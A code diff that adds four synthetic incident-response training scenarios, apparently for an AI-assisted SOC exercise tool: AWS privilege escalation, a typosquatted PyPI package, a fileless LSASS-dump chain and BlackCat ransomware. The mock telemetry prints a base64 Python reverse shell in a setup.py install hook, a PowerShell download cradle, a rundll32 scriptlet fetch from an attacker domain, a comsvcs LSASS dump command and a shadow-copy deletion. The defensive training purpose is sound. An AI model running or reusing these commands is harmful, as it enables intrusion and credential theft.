@@ -820,6 +820,330 @@ T+72h (2024-03-12T07:18Z) — EDR finally alerts on LSASS and NTDS.dit anomalies
 
 Draft a board-level IR report including: Executive Summary for non-technical board members, full technical timeline, blast radius assessment, regulatory obligations, immediate containment actions, and a 90-day strategic remediation roadmap.`,
   },
+
+  // ══════════════════════════════════════════════════════════════════════════
+  // ADVANCED PACK — added Run 2
+  // ══════════════════════════════════════════════════════════════════════════
+
+  {
+    id: 'LT-004',
+    title: 'Log Triage – AWS CloudTrail: IAM Privilege Escalation + S3 Exfil',
+    taskType: 'log-triage',
+    difficulty: 'advanced',
+    attackCategory: 'Cloud Identity Abuse',
+    mitre: {
+      tactic: 'Privilege Escalation / Exfiltration',
+      techniques: [
+        'T1078.004 – Valid Accounts: Cloud Accounts',
+        'T1548 – Abuse Elevation Control Mechanism',
+        'T1537 – Transfer Data to Cloud Account',
+      ],
+    },
+    iocs: {
+      ips: ['185.220.101.12', '194.165.16.77'],
+      domains: ['attacker-exfil-bucket.s3.us-east-1.amazonaws.com'],
+      hashes: [],
+      other: ['arn:aws:iam::123456789012:user/svc-terraform', 'ASIA3EXAMPLE7K9QRSTU'],
+    },
+    description:
+      'AWS CloudTrail showing a compromised CI/CD IAM user escalating to AdministratorAccess and exfiltrating 4.2 GB of customer PII from an S3 bucket to an attacker-controlled account.',
+    incidentData: `INCIDENT: AWS CloudTrail Multi-Region Analysis
+Account: 123456789012 (prod-eu-west-1) | Analyst: Tier 3 Cloud IR
+Timeframe: 2024-04-02T19:04:11Z – 19:41:03Z | Source IPs: 185.220.101.12, 194.165.16.77
+
+=== CLOUDTRAIL EVENTS (chronological) ===
+
+[19:04:11Z] ConsoleLogin — UserName: svc-terraform | IP: 185.220.101.12
+  MFA: false | Auth: ACCESS_KEY | ResponseElements: { ConsoleLogin: "Success" }
+  NOTE: svc-terraform has never logged in from this IP or region
+
+[19:04:44Z] GetCallerIdentity — UserName: svc-terraform | IP: 185.220.101.12
+  (Attacker confirming account context)
+
+[19:05:01Z] ListAttachedUserPolicies — UserName: svc-terraform (self-enumeration)
+  CurrentPolicies: AmazonS3ReadOnly, AmazonEC2ReadOnlyAccess
+
+[19:05:18Z] CreatePolicyVersion — Principal: svc-terraform | TargetPolicy: svc-terraform-policy
+  NewPolicyDocument: { "Action": "iam:*", "Resource": "*", "Effect": "Allow" }
+  (IAM policy version limit allows self-modification — classic priv-esc vector)
+
+[19:05:22Z] SetDefaultPolicyVersion — PolicyArn: arn:aws:iam::123456789012:policy/svc-terraform-policy
+  NewVersionId: v5 (replaces v4 with iam:* permissions)
+
+[19:06:03Z] AttachUserPolicy — Principal: svc-terraform → TargetUser: svc-terraform
+  PolicyArn: arn:aws:iam::aws:policy/AdministratorAccess
+
+[19:06:30Z] CreateAccessKey — UserName: backdoor-svc | NewKeyId: ASIA3EXAMPLE7K9QRSTU
+  (New IAM user created for persistence)
+
+[19:07:11Z] CreateUser — UserName: backdoor-svc | Principal: svc-terraform
+
+[19:08:55Z] ListBuckets — UserName: svc-terraform (35 buckets enumerated)
+
+[19:09:44Z] GetBucketLocation — BucketName: prod-customer-pii-eu
+  (Targeting EU customer PII bucket — GDPR Article 33 scope)
+
+[19:10:02Z] ListObjectsV2 — BucketName: prod-customer-pii-eu
+  Objects: 14,892 | TotalSize: ~4.2 GB | Prefixes: customers/, transactions/, kyc-docs/
+
+[19:11:33Z – 19:41:03Z] GetObject (repeated) × 14,892 — BucketName: prod-customer-pii-eu
+  DestinationIP: 194.165.16.77 | BytesTransferred: 4,294,967,296
+  UserAgent: "aws-cli/2.15.0 Python/3.12.0 Linux/5.15"
+
+[19:41:03Z] PutObject × 14,892 — BucketName: attacker-exfil-bucket (external account)
+  [Cross-account S3 replication — data now in attacker-controlled AWS account]
+
+=== GUARD DUTY FINDINGS (retroactive) ===
+- PrivilegeEscalation:IAMUser/AdministratorAccess (CRITICAL)
+- Exfiltration:S3/ObjectRead (HIGH) — anomalous volume: 4.2 GB in 30 min
+- PersistenceCreation:IAMUser/SuspiciousUserCreated (HIGH)
+
+=== CONTEXT ===
+- svc-terraform access key rotated 47 days ago; last normal activity: 2024-03-30
+- prod-customer-pii-eu contains GDPR Article 9 data: full name, DOB, national ID
+- No VPC CloudTrail enabled — S3 data event logging enabled separately
+- GDPR 72-hour notification clock started at 19:04:11Z
+
+Triage this incident: establish the attack chain, extract all cloud-specific IOCs, assess GDPR Article 33 notification scope, and recommend immediate containment actions.`,
+  },
+
+  {
+    id: 'AR-004',
+    title: 'Alert Enrichment – Malicious PyPI Package: Supply Chain Compromise',
+    taskType: 'alert-enrichment',
+    difficulty: 'advanced',
+    attackCategory: 'Supply Chain',
+    mitre: {
+      tactic: 'Initial Access / Persistence',
+      techniques: [
+        'T1195.001 – Supply Chain Compromise: Compromise Software Dependencies',
+        'T1059.006 – Command and Scripting Interpreter: Python',
+        'T1567.002 – Exfiltration to Cloud Storage',
+      ],
+    },
+    iocs: {
+      ips: ['45.141.86.220'],
+      domains: ['cdn.requests-lib.io', 'pypi.requests-httplib.com'],
+      hashes: ['4a8f2c9d1e6b3a7f0c5d2e8b4a1f9c6d3e7a0b2f5c8d1e4a7b0c3f6e9d2a5b8'],
+      other: ['requests-httplib==2.29.0', 'setup.py.__post_init__', '_INSTALL_HOOK_'],
+    },
+    description:
+      'SAST pipeline and EDR alert bundle flagging a typosquatted PyPI package — "requests-httplib" — that executes a reverse shell at install time, affecting 3 internal dev workstations.',
+    incidentData: `INCIDENT: Supply Chain Alert — Malicious PyPI Package
+Source: Semgrep SAST + CrowdStrike EDR | Priority: P1-CRITICAL
+Detection Time: 2024-04-08T10:22:14Z | Affected Systems: WS-DEV-04, WS-DEV-07, WS-DEV-11
+
+=== SAST ALERT (Semgrep) [10:22:14Z] ===
+Rule: python.supply-chain.typosquat-dependency
+File: requirements.txt
+Match: requests-httplib==2.29.0
+Detail: Known typosquat of "requests" (legitimate: requests==2.31.0). Package
+        "requests-httplib" not on allowlist. SHA256 of installed wheel:
+        4a8f2c9d1e6b3a7f0c5d2e8b4a1f9c6d3e7a0b2f5c8d1e4a7b0c3f6e9d2a5b8
+
+=== PACKAGE ANALYSIS (sandbox detonation) ===
+Package: requests-httplib 2.29.0 (PyPI, published 2024-04-07T06:11Z)
+Publisher: "requests-compat-dev" (created 2024-04-07 — 18 hours before alert)
+Download count: 1,847 (spiked 400% in 24 hours via dependency confusion vector)
+
+setup.py (annotated):
+  import os, subprocess, base64
+  class _INSTALL_HOOK_:
+    def __init__(self): pass
+    def __post_init__(self):
+      # Executed at pip install time — before any user code runs
+      payload = base64.b64decode("aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgiNDUuMTQxLjg2LjIyMCIsODA4MCk7b3MuZHVwMihncy5maWxlbm8oKSwwKTs=")
+      exec(payload)  # Python reverse shell to 45.141.86.220:8080
+
+=== EDR TELEMETRY — WS-DEV-04 (10:24:01Z) ===
+Process tree:
+  pip.exe (PID 9944) → python.exe (PID 9961) → cmd.exe (PID 9978)
+    → powershell.exe -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://cdn.requests-lib.io/stage2.ps1')"
+
+Network: WS-DEV-04 → 45.141.86.220:8080 (reverse shell, 00:12 duration)
+Network: WS-DEV-04 → cdn.requests-lib.io:443 (stage-2 download)
+File write: C:\Users\mike.chen\AppData\Local\Temp\svhost32.ps1 (persistence)
+Registry: HKCU\Software\Microsoft\Windows\CurrentVersion\Run → svhost32.ps1
+
+=== SIMILAR EDR EVENTS ===
+WS-DEV-07 (10:25:44Z): Same pip → python → cmd chain, same C2
+WS-DEV-11 (10:27:02Z): Same pattern; additional pip install of "boto3-extended" (second typosquat suspected)
+
+=== THREAT INTEL (pending enrichment) ===
+IP 45.141.86.220: [PENDING]
+Domain cdn.requests-lib.io: [PENDING]
+Hash 4a8f2c9d...: [PENDING]
+Publisher "requests-compat-dev": [PENDING]
+
+=== BLAST RADIUS QUESTIONS ===
+- Do any of WS-DEV-04/07/11 have access to AWS CI/CD credentials or secrets?
+- Is pypi.requests-httplib.com a previously-seen squatted domain?
+- What other internal packages depend on requests-httplib?
+
+Enrich all pending IOCs, classify the supply chain attack, map to MITRE ATT&CK, assess blast radius, and recommend immediate containment and remediation steps.`,
+  },
+
+  {
+    id: 'DR-004',
+    title: 'Detection Rule Gen – Fileless Malware: LOLBin C2 + LSASS Dump',
+    taskType: 'detection-rule-gen',
+    difficulty: 'advanced',
+    attackCategory: 'Credential Dumping',
+    mitre: {
+      tactic: 'Defense Evasion / Credential Access',
+      techniques: [
+        'T1218.011 – Signed Binary Proxy Execution: Rundll32',
+        'T1003.001 – OS Credential Dumping: LSASS Memory',
+        'T1071.001 – Application Layer Protocol: Web Protocols',
+        'T1059.001 – Command and Scripting Interpreter: PowerShell',
+      ],
+    },
+    iocs: {
+      ips: ['194.165.16.28'],
+      domains: ['update.msedge-telemetry.io'],
+      hashes: ['3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c'],
+      other: ['rundll32.exe comsvcs.dll MiniDump', 'wmi.dll reflective inject', 'clrjit.dll'],
+    },
+    description:
+      'Sysmon telemetry showing a fileless attack chain: rundll32 LOLBin loading shellcode, reflective DLL injection into WMI, HTTPS C2 beaconing, and LSASS dump via comsvcs. Write production detection rules.',
+    incidentData: `INCIDENT: Fileless Attack Chain — Sysmon Telemetry Package
+Host: WS-HR-09 (10.0.3.47) | Analyst: Detection Engineering Request
+Timeframe: 2024-04-10T16:02:11Z – 16:08:44Z
+
+=== SYSMON EVENTS ===
+
+[EventID=1 — Process Create — 16:02:11Z]
+  Image: C:\\Windows\\System32\\rundll32.exe
+  CommandLine: rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";document.write();GetObject("script:http://update.msedge-telemetry.io/payload.sct")
+  ParentImage: C:\\Windows\\System32\\wscript.exe
+  ParentCommandLine: wscript.exe //nologo //e:jscript C:\\Users\\Public\\config.js
+  (Squiblydoo/AppLocker bypass variant via rundll32 + scriptlet)
+
+[EventID=8 — CreateRemoteThread — 16:02:28Z]
+  SourceImage: C:\\Windows\\System32\\rundll32.exe
+  TargetImage: C:\\Windows\\System32\\wbem\\WmiPrvSE.exe
+  StartAddress: 0x7ffefba20000
+  (Reflective DLL injection from rundll32 → WmiPrvSE — fileless persistence in trusted process)
+
+[EventID=3 — Network Connection — 16:02:35Z]
+  Image: C:\\Windows\\System32\\wbem\\WmiPrvSE.exe
+  DestinationIp: 194.165.16.28 | DestinationPort: 443
+  Initiated: true
+  (C2 beacon from injected WmiPrvSE — masquerades as legitimate WMI telemetry)
+
+[EventID=7 — ImageLoaded — 16:03:01Z]
+  Image: C:\\Windows\\System32\\wbem\\WmiPrvSE.exe
+  ImageLoaded: C:\\Windows\\System32\\wmi.dll (reflective inject artifact)
+  Signed: false | MD5: 3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c
+
+[EventID=10 — Process Access — 16:07:52Z]
+  SourceImage: C:\\Windows\\System32\\wbem\\WmiPrvSE.exe
+  TargetImage: C:\\Windows\\System32\\lsass.exe
+  GrantedAccess: 0x1FFFFF (PROCESS_ALL_ACCESS)
+  CallTrace: ...\\clrjit.dll+0x1234 (shellcode trampoline)
+
+[EventID=1 — Process Create — 16:08:44Z]
+  Image: C:\\Windows\\System32\\rundll32.exe
+  CommandLine: rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump 724 C:\\Windows\\Temp\\mem.dmp full
+  ParentImage: C:\\Windows\\System32\\wbem\\WmiPrvSE.exe
+  (comsvcs MiniDump — well-known LSASS dump technique via LOLBin)
+
+=== DETECTION ENGINEERING BRIEF ===
+The team needs production-ready detection content for:
+1. Rundll32 scriptlet/COM object abuse (Squiblydoo pattern)
+2. Reflective DLL injection into trusted host processes (WmiPrvSE, svchost, etc.)
+3. LSASS dump via comsvcs MiniDump LOLBin
+4. C2 beaconing from non-browser Windows processes over HTTPS
+
+For each technique write: a complete Sigma rule, a KQL query for Microsoft Sentinel,
+false-positive tuning guidance, and MITRE ATT&CK coverage mapping.`,
+  },
+
+  {
+    id: 'IR-004',
+    title: 'Incident Report – BlackCat/ALPHV Ransomware: Enterprise-Wide Encryption',
+    taskType: 'incident-report-draft',
+    difficulty: 'advanced',
+    attackCategory: 'Ransomware',
+    mitre: {
+      tactic: 'Multiple (Full Kill Chain)',
+      techniques: [
+        'T1566.001 – Phishing: Spearphishing Attachment',
+        'T1486 – Data Encrypted for Impact',
+        'T1490 – Inhibit System Recovery',
+        'T1048 – Exfiltration Over Alternative Protocol',
+        'T1021.002 – Remote Services: SMB/Windows Admin Shares',
+      ],
+    },
+    iocs: {
+      ips: ['91.215.85.42', '185.220.101.91'],
+      domains: ['alphvmmm27o3abo3r2mlmjiwblt3qzumfxhbdzzm2vxb2dtarkmyunad.onion'],
+      hashes: [
+        'f7b2a1c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1',
+        'c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f4a3b2c1d0e9f8a7b6c5d4e3f2a1b0c9d8',
+      ],
+      other: ['.alphvm encrypted extension', 'RECOVER-MY-FILES.txt', 'vssadmin delete shadows'],
+    },
+    description:
+      'BlackCat/ALPHV ransomware: initial access via macro-laced Excel, 6-day dwell, Kerberoasting + NTDS exfil, double-extortion, enterprise-wide encryption. Draft an executive IR report.',
+    incidentData: `TASK: Draft Executive & Technical Incident Report
+Incident: INC-2024-0441 | Threat Actor: BlackCat/ALPHV (affiliate cluster)
+Classification: RANSOMWARE — DOUBLE EXTORTION | Response Status: Active
+Scope: 847 workstations, 23 servers, 4 domain controllers | Duration: 6 days dwell
+
+=== KILL CHAIN RECONSTRUCTION ===
+
+Day 0 (2024-04-01T08:44Z) — Initial Access
+  Vector: Spearphishing email → Excel macro (T1566.001)
+  Recipient: accounts-payable@corp.example.com
+  Attachment: Invoice_March_2024.xlsm (SHA256: f7b2a1c3...)
+  Macro spawned: cmd.exe → mshta.exe → PowerShell download cradle
+  C2 established: 91.215.85.42:443 (CobaltStrike Beacon, 60-min jitter)
+
+Day 1–3 — Reconnaissance & Lateral Movement
+  T1087 — AD enumeration via BloodHound (SharpHound collector)
+  T1558.003 — Kerberoasting: 14 SPNs cracked (incl. MSSQLSvc, SMBShare)
+  T1021.002 — SMB lateral movement to 47 workstations
+  T1078 — svc_sqladmin (cracked via Kerberoast) used for DC access
+
+Day 4 — Privilege Escalation + Exfiltration
+  T1003.003 — NTDS.dit dumped on DC01, DC02, DC03, DC04
+  T1048 — 14.8 GB exfiltrated to 185.220.101.91 via custom HTTPS uploader
+  Data categories: HR records (2,200 employees), financial projections, M&A dossier
+
+Day 5 — Pre-Encryption Staging
+  Ransomware binary deployed to ADMIN$ shares on all reachable hosts:
+    SHA256: c9d8e7f6...
+  Scheduled task set for T+24h execution
+  Shadow copies wiped: vssadmin delete shadows /all /quiet (on all DCs)
+  Backup jobs killed: net stop veeam*, net stop "Windows Server Backup"
+
+Day 6 (2024-04-07T06:00Z) — Encryption Execution
+  BlackCat/ALPHV Rust binary executed simultaneously across 847 endpoints
+  File extensions: .alphvm applied to ~2.4 million files
+  Ransom note: RECOVER-MY-FILES.txt (Tor onion address in note)
+  Demand: 4.8 BTC (~$320,000 USD at time of incident)
+  Threat: publish HR and M&A data on ALPHV leak site within 72 hours
+
+=== CURRENT STATUS ===
+- Active encryption: CONTAINED (network isolated at 06:17Z)
+- Encrypted systems offline: 847 workstations, 23 servers
+- Clean backups: Tape backups intact (last verified 2024-03-31)
+- Decryptor: Not purchased; negotiation not initiated
+- Data leak threat: 72-hour clock began 2024-04-07T06:00Z
+
+=== REGULATORY EXPOSURE ===
+- GDPR Art. 33: 72-hour notification window open (employee PII exfiltrated)
+- GDPR Art. 34: Notification to affected data subjects likely required
+- SEC 8-K: Material cybersecurity incident — 4-day disclosure rule applies (public company)
+- Cyber insurance: Insurer notified; coverage review pending
+
+Draft a full executive + board-level IR report covering: executive summary for non-technical board,
+technical kill chain, ransomware-specific lessons (why traditional backups did not prevent this),
+GDPR and SEC disclosure obligations, 30/60/90-day recovery roadmap, and strategic recommendations to
+prevent recurrence. Include a section on how AI-powered detection tools could have shortened the
+6-day dwell time.`,
+  },
 ];
 
 // ─── Scenario Generator ───────────────────────────────────────────────────────
